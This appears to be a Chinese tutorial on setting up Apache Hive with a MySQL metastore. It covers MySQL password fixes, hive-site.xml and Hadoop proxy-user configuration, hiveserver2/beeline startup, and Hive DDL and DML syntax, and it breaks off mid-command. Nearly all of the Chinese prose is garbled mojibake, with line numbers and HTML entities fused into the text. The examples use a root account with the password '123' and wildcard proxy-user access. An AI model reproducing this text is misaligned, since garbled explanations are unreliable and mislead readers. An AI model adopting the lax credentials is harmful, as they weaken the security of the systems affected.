##åœ¨mysql5.7ç‰ˆæœ¬å¦‚ä¸‹ï¼šupdate mysql.user set authentication_string=password(&apos;newpassword&apos;) ;# ä¿®æ”¹å®Œäº†é‡å¯service mysql restart====================================== MySqlçš„å…¶å®ƒé”™è¯¯åœ¨è¿è¡Œschematool -dbType mysql -initSchemaæ‰‹åŠ¨åˆå§‹åŒ–å…ƒæ•°æ®åº“çš„æ—¶å€™ æŠ¥äº†ä¸€ä¸ªlog4jé‡å¤åŠ è½½çš„é—®é¢˜ è§£å†³ï¼šå¯ä»¥ä¸ç”¨ç†ç¬ é“¾æ¥mysql å¯†ç è¿‡æœŸé—®é¢˜ Your password has expired. è§£å†³ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950mysql -uroot -p123mysql&gt; use mysqlReading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; select host,user,password_expired from user;+-----------+------+------------------+| host | user | password_expired |+-----------+------+------------------+| % | root | N || cs1 | root | Y || 127.0.0.1 | root | Y || ::1 | root | Y |+-----------+------+------------------+4 rows in set (0.00 sec)-------------mysql&gt; update user set password_expired=&apos;N&apos; where host=&apos;::1&apos;;Query OK, 1 row affected (0.01 sec)Rows matched: 1 Changed: 1 Warnings: 0mysql&gt; update user set password_expired=&apos;N&apos; where host=&apos;cs1&apos;;Query OK, 1 row affected (0.00 sec)Rows matched: 1 Changed: 1 Warnings: 0mysql&gt; update user set password_expired=&apos;N&apos; where host=&apos;127.0.0.1&apos;;Query OK, 1 row affected (0.00 sec)Rows matched: 1 Changed: 1 Warnings: 0mysql&gt; FLUSH PRIVILEGES;Query OK, 0 rows affected (0.00 sec)mysql&gt; select host,user,password_expired from user;+-----------+------+------------------+| host | user | password_expired |+-----------+------+------------------+| % | root | N || cs1 | root | N || 127.0.0.1 | root | N || ::1 | root | N |+-----------+------+------------------+4 rows in set (0.00 sec)mysql&gt; exitBye[ap@cs1]~/apps/hive% sudo service mysql restart# å†é‡æ–°åˆå§‹åŒ–å°±å¥½äº† Yumå®‰è£… Mysql å› ä¸ºç¬”è€…æ²¡è£…è¿‡ï¼Œæ‰€ä»¥è¿™éƒ¨åˆ†æš‚ä¸”ä¸è¡¨ step2-å®‰è£…HiveMySqlå®‰è£…å¥½ä¹‹åï¼Œ å®‰è£…Hiveå°±å¾ˆç®€ç­”äº† æ³¨æ„: Hive æ˜¯æ“ä½œ Mysql çš„æ•°æ®åº“, ä¸€å®šè¦è®°å¾—æŠŠ mysql é©±åŠ¨æ–‡ä»¶æ”¾åˆ° hive ä¸‹çš„ lib ä¸­!!!å¯åŠ¨beeline å‰, è¦æŠŠ hiveserver2å¼€èµ·æ¥, å½“ç„¶, hdfs, mysql éƒ½è¦å¯åŠ¨èµ·æ¥123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132# 1.ä¸Šä¼ åˆ°Linux# 2.è§£å‹å®‰è£…åŒ…åˆ°å®‰è£…ç›®å½•tar -zxvf apache-hive-2.3.2-bin.tar.gz -C ~/apps/# 3.æŠŠMySQLé©±åŠ¨åŒ…(mysql-connector-java-5.1.40-bin.jar)æ”¾ç½®åœ¨hive çš„æ ¹è·¯å¾„ä¸‹çš„ lib ç›®å½•ï¼Œæ­¤å¤„æ˜¯ ~/apps/apache-hive-2.3.2-bin/lib# 4.ä¿®æ”¹é…ç½®æ–‡ä»¶cd ~/apps/apache-hive-2.3.2-bin/conf# æ–°å»ºä¸€ä¸ª hive-site.xmltouch hive-site.xmlvi hive-site.xml+++++++++++++++++++++++++++++++++++++++++++æ·»åŠ å¦‚ä¸‹å†…å®¹++++++++++++&lt;configuration&gt; &lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionURL&lt;/name&gt; &lt;value&gt;jdbc:mysql://localhost:3306/hivedb?createDatabaseIfNotExist=true&lt;/value&gt; &lt;description&gt;JDBC connect string for a JDBC metastore&lt;/description&gt; &lt;!-- æ³¨æ„:å¦‚æœmysqlå’Œhive ä¸åœ¨åŒä¸€ä¸ªæœåŠ¡å™¨èŠ‚ç‚¹,éœ€è¦ä½¿ç”¨mysqlèŠ‚ç‚¹çš„ hostname æˆ– ip --&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionDriverName&lt;/name&gt; &lt;value&gt;com.mysql.jdbc.Driver&lt;/value&gt; &lt;description&gt;Driver class name for a JDBC metastore&lt;/description&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionUserName&lt;/name&gt; &lt;value&gt;root&lt;/value&gt; &lt;description&gt;username to use against metastore database&lt;/description&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionPassword&lt;/name&gt; &lt;value&gt;123&lt;/value&gt; &lt;description&gt;password to use against metastore database&lt;/description&gt; &lt;/property&gt;&lt;/configuration&gt;+++++++++++++++++++++++++++++++++++++++++++æ·»åŠ å¦‚ä¸‹å†…å®¹+++++++++++ &lt;property&gt; &lt;name&gt;hive.metastore.warehouse.dir&lt;/name&gt; &lt;value&gt;/user/hive/warehouse&lt;/value&gt; &lt;description&gt;hive default warehouse, if nessecory, change it &lt;!-- è¿™ä¸ªæ˜¯é…ç½®hiveåœ¨HDFSä¸Š db çš„è·¯å­˜å‚¨å¾„çš„ï¼Œä¸é…é»˜è®¤é»˜è®¤å°±æ˜¯ä¸Šè¿°è·¯å¾„ --&gt; &lt;/description&gt; &lt;/property&gt;++++++++++++++++++++++++++# 5.é…ç½®ç¯å¢ƒå˜é‡ &amp; source## æ³¨æ„ï¼šapæ˜¯æˆ‘çš„ç”¨æˆ·å®¶ç›®å½•ï¼Œæ¢ä¸Šè‡ªå·±çš„ç”¨æˆ·å®¶ç›®å½•export HIVE_HOME=/home/ap/apps/apache-hive-2.3.2-bin export PATH=$PATH:$HIVE_HOME/bin# ç”¨bashçš„æ‰¾ .bash_profileï¼Œ é…ç½®æ‰€æœ‰ç¯å¢ƒå˜é‡source ~/.zshrc # 6.æ­¤æ—¶åŸºæœ¬å®‰è£…å®Œæˆäº†ï¼ŒéªŒè¯Hiveå®‰è£…hive --helo# 7.é‡ç‚¹æ¥äº†ï¼ åˆå§‹åŒ–å…ƒæ•°æ®åº“schematool -dbType mysql -initSchema&gt; è¿™é‡Œå¯èƒ½ä¼šé‡åˆ°å¾ˆå¤šé”™è¯¯ï¼ï¼ &gt; ä½†æ˜¯å¦‚æœå‰é¢æŒ‰ç…§æˆ‘çš„æ–¹æ³•è£…çš„, åº”è¯¥å°±é—®é¢˜ä¸å¤§äº†&gt; ä¸»è¦æ˜¯ mysql è¿æ¥æƒé™çš„é—®é¢˜ï¼ï¼# ä¸€å®šä¼šå‡ºç°çš„2ä¸ª1&gt; æ‰¾ä¸åˆ° hiveå‘½ä»¤çš„ä¸€é•¿ä¸²ç¯å¢ƒå˜é‡ (ä¸ç”¨ç†ä¼š)2&gt; ä¸¤ä¸ªlog4jï¼ŒjaråŒ…é‡å¤çš„é—®é¢˜ (ä¸ç”¨ç†ä¼š)# 8.åˆå§‹åŒ–å®Œæˆåï¼Œå¯ä»¥çœ‹ä¸‹æ•°æ®åº“ä¸­æœ‰æ²¡æœ‰ hivedb è¿™ä¸ªåº“ï¼ŒæˆåŠŸçš„è¯æ˜¯ä¼šæœ‰çš„## å¯åŠ¨hivehive --service cli &gt;hive: show databases;# å¦‚æœèƒ½æ˜¾ç¤ºæ•°æ®åº“ï¼Œå°±æ²¡å•¥é—®é¢˜äº†# â¤ï¸9.Hiveçš„ä½¿ç”¨æ–¹å¼ä¹‹ HiveServer2/beelineæ­¤å¤„éœ€è¦ä¿®æ”¹ hadoop çš„é…ç½®æ–‡ä»¶# 9.1.é¦–å…ˆå…³é—­hdfs &amp; yarnæœåŠ¡ &amp; RunJar(hiveæœåŠ¡)ï¼Œä¿®æ”¹hadoopé…ç½®æ–‡ä»¶# 9.2.ä¿®æ”¹ hadoop é›†ç¾¤çš„ hdfs-site.xml é…ç½®æ–‡ä»¶:åŠ å…¥ä¸€æ¡é…ç½®ä¿¡æ¯ï¼Œè¡¨ç¤ºå¯ç”¨ webhdfs&lt;property&gt; &lt;name&gt;dfs.webhdfs.enabled&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt;# 9.3.ä¿®æ”¹ hadoop é›†ç¾¤çš„ core-site.xml é…ç½®æ–‡ä»¶:åŠ å…¥ä¸¤æ¡é…ç½®ä¿¡æ¯:è¡¨ç¤ºè®¾ç½® hadoop çš„ä»£ç†ç”¨æˆ·## æ³¨æ„ï¼š æ­¤å¤„çš„apæ˜¯é…ç½® hadoop çš„ç”¨æˆ·å&lt;property&gt; &lt;name&gt;hadoop.proxyuser.ap.hosts&lt;/name&gt; &lt;value&gt;*&lt;/value&gt; &lt;!-- è¡¨ç¤ºä»»æ„èŠ‚ç‚¹ä½¿ç”¨ hadoop é›†ç¾¤çš„ä»£ç†ç”¨æˆ· hadoop éƒ½èƒ½è®¿é—® hdfs é›†ç¾¤ --&gt;&lt;/property&gt;&lt;property&gt; &lt;name&gt;hadoop.proxyuser.ap.groups&lt;/name&gt; &lt;value&gt;*&lt;/value&gt; &lt;!-- è¡¨ç¤ºä»£ç†ç”¨æˆ·çš„ç»„æ‰€å± --&gt;&lt;/property&gt;ï£¿ï£¿ï£¿ æ³¨æ„ ï£¿ï£¿ï£¿ä¿®æ”¹å®Œæˆåï¼Œ å‘ç»™hadoopé›†ç¾¤å…¶ä»–ä¸»æœºscp xxx.xx xxx.ss cs2:$PWDscp xxx.xx xxx.ss cs3:$PWD...# 9.4.é‡å¯hdfs &amp; yarnæœåŠ¡# 9.5.å¯åŠ¨ hiveserver2 æœåŠ¡## åå°å¯åŠ¨ï¼šnohup hiveserver2 1&gt;/home/ap/hiveserver.log 2&gt;/home/ap/hiveserver.err &amp; # æˆ–è€…:nohup hiveserver2 1&gt;/dev/null 2&gt;/dev/null &amp;# æˆ–è€…:nohup hiveserver2 &gt;/dev/null 2&gt;&amp;1 &amp;# ä»¥ä¸Š 3 ä¸ªå‘½ä»¤æ˜¯ç­‰ä»·çš„ï¼Œç¬¬ä¸€ä¸ªè¡¨ç¤ºè®°å½•æ—¥å¿—ï¼Œç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªè¡¨ç¤ºä¸è®°å½•æ—¥å¿—æ³¨æ„ï¼š nohup å¯ä»¥åœ¨ä½ é€€å‡ºå¸æˆ·/å…³é—­ç»ˆç«¯ä¹‹åç»§ç»­è¿è¡Œç›¸åº”çš„è¿›ç¨‹ã€‚ nohup å°±æ˜¯ä¸æŒ‚èµ·çš„æ„æ€(no hang up)ã€‚è¯¥å‘½ä»¤çš„ä¸€èˆ¬å½¢å¼ä¸º:nohup command &amp;# 9.6 å¯åŠ¨ beeline å®¢æˆ·ç«¯å»è¿æ¥æ–¹å¼1ï¼šæ‰§è¡Œå‘½ä»¤:beeline -u jdbc:hive2://cs2:10000 -n ap-u : æŒ‡å®šå…ƒæ•°æ®åº“çš„é“¾æ¥ä¿¡æ¯ -n : æŒ‡å®šç”¨æˆ·åå’Œå¯†ç æ–¹å¼2ï¼šå…ˆæ‰§è¡Œ beelineç„¶åæŒ‰å›¾æ‰€ç¤ºè¾“å…¥:# æ­¤å¤„çš„cs2æ˜¯åªå®‰è£…hiveçš„hostname!connect jdbc:hive2://cs2:10000 æŒ‰å›è½¦ï¼Œç„¶åè¾“å…¥ç”¨æˆ·åï¼Œå¯†ç ï¼Œè¿™ä¸ª ç”¨æˆ·åå°±æ˜¯å®‰è£… hadoop é›†ç¾¤çš„ç”¨æˆ·åå’Œå¯†ç  ç™»å½•beeline :bee:æ–¹å¼1: ç›´æ¥ç™»å½• ç™»å½•å‰è¦å¼€å¯ RunJar è¿›ç¨‹, ä¹Ÿå°±æ˜¯ å¼€å¯hiveserver2 nohup hiveserver2 1&gt;/home/ap/hiveserver.log 2&gt;/home/ap/hiveserver.err &amp; beeline -u jdbc:hive2://cs2:10000 -n ap æ–¹å¼2: è¾“å…¥ç”¨æˆ·åå¯†ç ç™»å½• !connect jdbc:hive2://cs2:10000 ç™»å½• hivehive PS: Linuxç¯å¢ƒå˜é‡å¤±æ•ˆ1234# å°±æ˜¯ç›´æ¥æŠŠç¯å¢ƒå˜é‡è®¾ç½®ä¸º/bin:/usr/binï¼Œå› ä¸ºå¸¸ç”¨çš„å‘½ä»¤éƒ½åœ¨/binè¿™ä¸ªæ–‡ä»¶å¤¹ä¸­ã€‚PATH=/bin:/usr/bin# æ¥ä¸‹æ¥ä¿®æ”¹ .bashr_profile æˆ–åˆ™ .zshrcä¸­çš„å†…å®¹å³å¯ï¼Œ ä¿®æ”¹å®Œäº†é‡æ–°source Hive â€“ DDLåº“çš„æ“ä½œ12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ åº“çš„æ“ä½œ ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿============================================================================# ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ å»ºåº“ ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿CREATE (DATABASE|SCHEMA) [IF NOT EXISTS] database_name [COMMENT database_comment][LOCATION hdfs_path][WITH DBPROPERTIES (property_name=property_value, ...)];1ã€åˆ›å»ºæ™®é€šåº“create database dbname;2ã€åˆ›å»ºåº“çš„æ—¶å€™æ£€æŸ¥å­˜ä¸å¦create databse if not exists dbname;3ã€åˆ›å»ºåº“çš„æ—¶å€™å¸¦æ³¨é‡Šcreate database if not exists dbname comment &apos;create my db named dbname&apos;;4ã€æŸ¥çœ‹åˆ›å»ºåº“çš„è¯¦ç»†è¯­å¥show create database mydb;# ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ æŸ¥çœ‹åº“ ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿1ã€æŸ¥çœ‹æœ‰å“ªäº›æ•°æ®åº“ show databases;2ã€æ˜¾ç¤ºæ•°æ®åº“çš„è¯¦ç»†å±æ€§ä¿¡æ¯è¯­æ³•:desc database [extended] dbname; ç¤ºä¾‹:desc database extended myhive;3ã€æŸ¥çœ‹æ­£åœ¨ä½¿ç”¨å“ªä¸ªåº“ select current_database();4ã€æŸ¥çœ‹åˆ›å»ºåº“çš„è¯¦ç»†è¯­å¥ show create database mydb;5ã€æŸ¥çœ‹ä»¥xxå¼€å¤´çš„åº“show databases like &apos;s*&apos;# ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ åˆ é™¤åº“ ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿åˆ é™¤åº“æ“ä½œ: drop database dbname; drop database if exists dbname; é»˜è®¤æƒ…å†µä¸‹ï¼Œhive ä¸å…è®¸åˆ é™¤åŒ…å«è¡¨çš„æ•°æ®åº“ï¼Œæœ‰ä¸¤ç§è§£å†³åŠæ³•:1ã€ æ‰‹åŠ¨åˆ é™¤åº“ä¸‹æ‰€æœ‰è¡¨ï¼Œç„¶ååˆ é™¤åº“2ã€ ä½¿ç”¨ cascade å…³é”®å­— drop database if exists dbname cascade; é»˜è®¤æƒ…å†µä¸‹å°±æ˜¯ restrictï¼ˆä¸¥æ ¼æ¨¡å¼ï¼‰, å2è¡Œæ•ˆæœä¸€æ · drop database if exists myhive drop database if exists myhive restrict# ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ åˆ‡æ¢åº“ ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿åˆ‡æ¢åº“æ“ä½œ:- è¯­æ³•:use database_name - å®ä¾‹:use myhive; è¡¨çš„æ“ä½œåˆ›å»ºè¡¨å»ºè¡¨è¯­æ³• CREATE [EXTERNAL] TABLE [IF NOT EXISTS] &lt;table_name&gt;åˆ›å»ºå†…éƒ¨è¡¨ï¼›æ·»åŠ EXTERNALå‚æ•°ä¼šåˆ›å»ºå¤–éƒ¨è¡¨ (col_name data_type [COMMENT col_comment], ...)æ·»åŠ å­—æ®µå’Œå­—æ®µæè¿° [COMMENT table_comment]æ·»åŠ è¡¨æè¿° [PARTITIONED BY (col_name data_type [COMMENT col_comment], ...)]æŒ‡å®šåˆ†åŒºå­—æ®µå’Œå­—æ®µæè¿°ï¼Œåˆ†åŒºå­—æ®µä¸èƒ½ä¸ºå»ºè¡¨å­—æ®µï¼ [CLUSTERED BY (col_name, col_name, ...)] SORTED BY (col_name [ASC|DESC], ...)] INTO num_buckets BUCKETS] æŒ‡å®šåˆ†æ¡¶å­—æ®µï¼Œåˆ†æ¡¶å­—æ®µå¿…é¡»ä¸ºå»ºè¡¨å­—æ®µï¼ æŒ‡å®šæ’åºå­—æ®µï¼Œæ­¤å­—æ®µä¹Ÿå¿…é¡»ä¸ºå»ºè¡¨å­—æ®µï¼ŒæŒ‡å®šçš„æ˜¯åˆ†æ¡¶å†…çš„æ’åº æŒ‡å®šåˆ†æ¡¶ä¸ªæ•°ï¼ˆhashåå†å–æ¨¡ï¼‰ [ROW FORMAT row_format]æŒ‡å®šåˆ†éš”ç¬¦ï¼Œrow_format æ ¼å¼ï¼šåˆ—åˆ†éš”ç¬¦ï¼š`delimited fields terminated by â€˜x&apos;` è¡Œåˆ†éš”ç¬¦ï¼š`line terminated by â€˜x&apos;` [STORED AS file_format]æŒ‡å®šå­˜å‚¨æ ¼å¼textfileï¼šæ–‡æœ¬æ ¼å¼ï¼Œé»˜è®¤ rcfileï¼šè¡Œåˆ—ç»“åˆæ ¼å¼ parquetï¼šå‹ç¼©æ ¼å¼ [LOCATION hdfs_path]æŒ‡å®šè¡¨åœ¨hsfsä¸Šçš„å­˜å‚¨è·¯å¾„ï¼Œä¸æŒ‡å®šçš„è¯å°±æŒ‰é…ç½®çš„è·¯å¾„å­˜å‚¨ï¼Œå¦‚æœä¹Ÿæ²¡æŒ‡å®šå°±åœ¨hiveé»˜è®¤çš„è·¯ç» /user/hive/warehouse å»ºè¡¨ä»£ç  a. åˆ›å»ºå†…éƒ¨è¡¨ create table mytable (id int, name string) row format delimited fields terminated by &#39;,&#39; stored as textfile; b. åˆ›å»ºå¤–éƒ¨è¡¨ create external table mytable2 (id int, name string) row format delimited fields terminated by &#39;,&#39; location &#39;/user/hive/warehouse/mytable2&#39;; c. åˆ›å»ºåˆ†åŒºè¡¨ create table table3(id int, name string) partitioned by(sex string) row format delimited fields terminated by &#39;,&#39; stored as textfile; æ’å…¥åˆ†åŒºæ•°æ®ï¼šload data local inpath &#39;/root/hivedata/mingxing.txt&#39; overwrite into table mytable3 partition(sex=&#39;girlâ€™); æŸ¥è¯¢è¡¨åˆ†åŒºï¼š show partitions mytable3 d. åˆ›å»ºåˆ†æ¡¶è¡¨ create table stu_buck(Sno int,Sname string,Sex string,Sage int,Sdept string) clustered by(Sno) sorted by(Sno DESC) into 4 buckets row format delimited fields terminated by &#39;,â€™; e. å¤åˆ¶è¡¨ create [external] table [if not exists] new_table like table_name; f. æŸ¥è¯¢è¡¨ create table table_a as select * from teble_b; æŸ¥çœ‹è¡¨ desc &lt;table_name&gt;ï¼šæ˜¾ç¤ºè¡¨çš„å­—æ®µä¿¡æ¯ desc formatted &lt;table_name&gt;ï¼šæ ¼å¼åŒ–æ˜¾ç¤ºè¡¨çš„è¯¦ç»†ä¿¡æ¯ desc extended &lt;table_name&gt;ï¼šæ˜¾ç¤ºè¡¨çš„è¯¦ç»†ä¿¡æ¯ ä¿®æ”¹è¡¨ é‡å‘½å ALTER TABLE old_name RENAME TO new_name ä¿®æ”¹å±æ€§ ALTER TABLE table_name SET TBLPROPERTIES (&#39;comment&#39; = &#39;my new students tableâ€™); ä¸æ”¯æŒä¿®æ”¹è¡¨åï¼Œå’Œè¡¨çš„æ•°æ®å­˜å‚¨ç›®å½• å¢åŠ /ä¿®æ”¹/æ›¿æ¢å­—æ®µ ALTER TABLE table_name ADD COLUMNS (col_spec [, col_spec ...])æ–°å¢çš„å­—æ®µä½ç½®åœ¨æ‰€æœ‰åˆ—åé¢ ( partition åˆ—å‰ ) ALTER TABLE table_name CHANGE c_name new_c_name new_c_type [FIRST | AFTER c_name]æ³¨æ„ä¿®æ”¹å­—æ®µæ—¶ï¼Œç±»å‹åªèƒ½ç”±å°ç±»å‹è½¬ä¸ºå¤§ç±»å‹ï¼Œä¸è®©å›æŠ¥é”™ï¼›ï¼ˆåœ¨hive1.2.2ä¸­å¹¶æ²¡æœ‰æ­¤é™åˆ¶ï¼‰ ALTER TABLE table_name REPLACE COLUMNS (col_spec [, col_spec ...])REPLACE è¡¨ç¤ºæ›¿æ¢è¡¨ä¸­æ‰€æœ‰å­—æ®µ æ·»åŠ /åˆ é™¤åˆ†åŒº æ·»åŠ åˆ†åŒºï¼šALTER TABLE table_name ADD [IF NOT EXISTS] PARTITION (partition_col = col_value1 [ ... ] ) [LOCATION &#39;location1â€™] åˆ é™¤åˆ†åŒºï¼šALTER TABLE table_name DROP [IF EXISTS] PARTITION (partition_col = col_value1 [ ... ] ) ä¿®æ”¹åˆ†åŒºè·¯å¾„ï¼šALTER TABLE student_p PARTITION (part=&#39;bb&#39;) SET LOCATION &#39;/myhive_bbbbbâ€™; [è¡¥å……ï¼š] 1ã€ é˜²æ­¢åˆ†åŒºè¢«åˆ é™¤ï¼šalter table student_p partition (part=â€™aaâ€™) enable no_drop; 2ã€ é˜²æ­¢åˆ†åŒºè¢«æŸ¥è¯¢ï¼šalter table student_p partition (part=â€™aaâ€™) enable offline;enable å’Œ disable æ˜¯åå‘æ“ä½œ åˆ é™¤è¡¨ drop table if exists &lt;table_name&gt;; æ¸…ç©ºè¡¨ä¼šä¿ç•™è¡¨ç»“æ„ truncate table table_name; truncate table table_name partition(city=&#39;beijingâ€™); å…¶ä»–è¾…åŠ©å‘½ä»¤ a. æŸ¥çœ‹æ•°æ®åº“åˆ—è¡¨ show databases; show databases like &#39;my*&#39;; b. æŸ¥çœ‹æ•°æ®è¡¨ show tables; show tables in db_name; c. æŸ¥çœ‹æ•°æ®è¡¨çš„å»ºè¡¨è¯­å¥ show create table table_name; d. æŸ¥çœ‹ hive å‡½æ•°åˆ—è¡¨ show functions; e. æŸ¥çœ‹ hive è¡¨çš„åˆ†åŒº show partitions table_name; show partitions table_name partition(city=&#39;beijing&#39;) f. æŸ¥çœ‹è¡¨çš„è¯¦ç»†ä¿¡æ¯ï¼ˆå…ƒæ•°æ®ä¿¡æ¯ï¼‰ desc table_name; desc extended table_name; g. æŸ¥çœ‹æ•°æ®åº“çš„è¯¦ç»†å±æ€§ä¿¡æ¯ desc formatted table_name; desc database db_name; desc database extended db_name; h. æ¸…ç©ºæ•°æ®è¡¨ truncate table table_name; Hive â€“ DMLè£…è½½æ•°æ® LOAD DATA [LOCAL] INPATH &#39;filepath&#39; [OVERWRITE] INTO TABLE table_name [PARTITION (partcol1=val1, partcol2=val2 ...)] æ³¨æ„ï¼š LOAD æ“ä½œåªæ˜¯å•çº¯çš„ å¤åˆ¶ï¼ˆæœ¬åœ°æ–‡ä»¶ï¼‰æˆ–è€… ç§»åŠ¨ï¼ˆhdfsæ–‡ä»¶ï¼Œä¸€èˆ¬æ˜¯å…¬å…±æ•°æ®ï¼Œéœ€è¦å»ºç«‹å¤–éƒ¨è¡¨ï¼‰æ“ä½œï¼Œå°†æ•°æ®æ–‡ä»¶ç§»åŠ¨åˆ° Hive è¡¨å¯¹åº”çš„ä½ç½® å¦‚æœæŒ‡å®šäº† LOCAL å°±å»æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­æŸ¥æ‰¾ï¼Œå¦åˆ™æŒ‰ inpath ä¸­çš„ uri åœ¨ hdfs ä¸ŠæŸ¥æ‰¾ inpath å­å¥ä¸­çš„æ–‡ä»¶è·¯å¾„ä¸‹ï¼Œä¸èƒ½å†æœ‰æ–‡ä»¶å¤¹ å¦‚æœä½¿ç”¨äº† OVERWRITE å…³é”®å­—ï¼Œåˆ™ç›®æ ‡è¡¨ï¼ˆæˆ–è€…åˆ†åŒºï¼‰ä¸­çš„å†…å®¹ä¼šè¢«åˆ é™¤ï¼Œç„¶åå†å°† filepath æŒ‡å‘çš„æ–‡ä»¶/ç›®å½•ä¸­çš„å†…å®¹æ·»åŠ åˆ°è¡¨/åˆ†åŒºä¸­ã€‚ å¦‚æœç›®æ ‡è¡¨ï¼ˆåˆ†åŒºï¼‰å·²ç»æœ‰ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”æ–‡ä»¶åå’Œ filepath ä¸­çš„æ–‡ä»¶åå†²çªï¼Œé‚£ä¹ˆç°æœ‰çš„æ–‡ä»¶ä¼šè¢«æ–°æ–‡ä»¶æ‰€æ›¿ä»£ã€‚???ä¸æ˜¯è‡ªåŠ¨é‡å‘½åä¸ºxxx_copy_1 æ’å…¥æ•°æ® a. å•æ¡æ’å…¥ INSERT INTO TABLE table_name VALUES(value1, value2, ...); b. å•é‡æ’å…¥ INSERT INTO TABLE table_name [PARTITION (partcol1=val1, ...)] &lt;select_statement1 FROM from_statement&gt; c. å¤šé‡æ’å…¥ FROM from_statementä»åŸºè¡¨ä¸­æŒ‰ä¸åŒçš„å­—æ®µæŸ¥è¯¢å¾—åˆ°çš„ç»“æœåˆ†åˆ«æ’å…¥ä¸åŒçš„ hive è¡¨åªä¼šæ‰«æä¸€æ¬¡åŸºè¡¨ï¼Œæé«˜æŸ¥è¯¢æ€§èƒ½ INSERT INTO TABLE table_name1 [PARTITION (partcol1=val1, partcol2=val2 ...)] select_statement1 [WHERE where_statement] INSERT INTO TABLE table_name2 [PARTITION (partcol1=val1, partcol2=val2 ...)] select_statement2 [WHERE where_statement] [ â€¦ ]; d. åˆ†åŒºæ’å…¥ åˆ†åŒºæ’å…¥æœ‰ä¸¤ç§ï¼šä¸€ç§æ˜¯é™æ€åˆ†åŒºï¼Œå¦ä¸€ç§æ˜¯åŠ¨æ€åˆ†åŒºã€‚ å¦‚æœæ··åˆä½¿ç”¨é™æ€åˆ†åŒºå’ŒåŠ¨æ€åˆ†åŒºï¼Œ åˆ™é™æ€åˆ†åŒºå¿…é¡»å‡ºç°åœ¨åŠ¨æ€åˆ†åŒºä¹‹å‰ã€‚ é™æ€åˆ†åŒº A)ã€åˆ›å»ºé™æ€åˆ†åŒºè¡¨ B)ã€ä»æŸ¥è¯¢ç»“æœä¸­å¯¼å…¥æ•°æ®ï¼ˆå•é‡æ’å…¥ï¼‰è®°å¾—åŠ è½½æ•°æ®å‰è¦æ·»åŠ åˆ†åŒºï¼Œç„¶åæŒ‡å®šè¦åŠ è½½åˆ°é‚£ä¸ªåˆ†åŒº C)ã€æŸ¥çœ‹æ’å…¥ç»“æœ åŠ¨æ€åˆ†åŒº é™æ€åˆ†åŒºæ·»åŠ æ•°æ®å‰éœ€è¦æŒ‡å®šåˆ†åŒºï¼Œå½“åˆ†åŒºä¸ªæ•°ä¸ç¡®å®šçš„æ—¶å€™å°±å¾ˆä¸æ–¹ä¾¿äº†ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥ä½¿ç”¨åŠ¨æ€åˆ†åŒº é‡è¦ä¸”å¸¸ç”¨ï¼Œå°¤å…¶æ˜¯æŒ‰ç…§æ—¥æœŸåˆ†åŒºæ—¶ï¼ A)ã€åˆ›å»ºåˆ†åŒºè¡¨ B)ã€å‚æ•°è®¾ç½® hive-1.2ç‰ˆæœ¬ - set hive.exec.dynamic.partition=true; //åŠ¨æ€åˆ†åŒºå¼€å¯çŠ¶æ€ï¼Œé»˜è®¤å¼€å¯ - set hive.exec.dynamic.partition.mode=nonstrict; //åŠ¨æ€åˆ†åŒºæ‰§è¡Œæ¨¡å¼ï¼Œé»˜è®¤&quot;strict&quot;ï¼Œåœ¨è¿™ç§æ¨¡å¼ ä¸‹è¦æ±‚è‡³å°‘æœ‰ä¸€åˆ—åˆ†åŒºå­—æ®µæ˜¯é™æ€çš„ï¼Œè¿™æœ‰åŠ©äºé˜»æ­¢å› è®¾è®¡é”™è¯¯å¯¼è‡´æŸ¥è¯¢äº§ç”Ÿå¤§é‡çš„åˆ†åŒº - \# å¯é€‰è®¾ç½®é¡¹ å¦‚æœè¿™äº›å‚æ•°è¢«æ›´æ”¹äº†åˆæƒ³è¿˜åŸï¼Œåˆ™æ‰§è¡Œä¸€æ¬¡ reset å‘½ä»¤å³å¯ - set hive.exec.max.dynamic.partitions.pernode=100; //æ¯ä¸ªèŠ‚ç‚¹ç”ŸæˆåŠ¨æ€åˆ†åŒºæœ€å¤§ä¸ªæ•° - set hive.exec.max.dynamic.partitions=1000; //ç”ŸæˆåŠ¨æ€åˆ†åŒºæœ€å¤§ä¸ªæ•°ï¼Œå¦‚æœè‡ªåŠ¨åˆ†åŒºæ•°å¤§äºè¿™ä¸ªå‚æ•°ï¼Œå°†ä¼šæŠ¥é”™ - set hive.exec.max.created.files=100000; //ä¸€ä¸ªä»»åŠ¡æœ€å¤šå¯ä»¥åˆ›å»ºçš„æ–‡ä»¶æ•°ç›® - set 